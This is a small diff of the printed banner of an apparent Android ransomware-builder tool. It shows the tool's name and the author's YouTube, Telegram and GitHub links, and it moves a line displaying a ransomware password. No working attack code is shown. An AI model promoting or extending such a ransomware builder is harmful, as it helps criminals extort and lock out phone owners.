@@ -35,11 +35,12 @@ print ( """\033[1;31m
    /_____/ /_/  \__,_/ \___/ /_/|_|      /_____/  _\__, / \____/
                                                   /____/
      THE TOOL BY BO HAYDAR TO MAKE RANSOMWARE FOR ANDROID SYSTEM
-               \033[0;101m\033[1;34m Ransomware Passwrd \033[1;32m : 10203040506070 \033[0;32m
+     
      \033[1;31m YouTube   :\033[1;32m  https://youtube.com/@BO_HAYDAR_HK
      \033[1;31m Telegram  :\033[1;32m  https://t.me/txrtm
      \033[1;31m Tele Team :\033[1;32m  https://t.me/+EHo65POl1yA2ZjA0
      \033[1;31m Gitub     :\033[1;32m  https://github.com/bohaydar
+               \033[0;101m\033[1;34m Ransomware Passwrd \033[1;32m : 10203040506070 \033[0;32m
      \033[1;36m
     _____________________________________________________________
    |_____________________________________________________________|
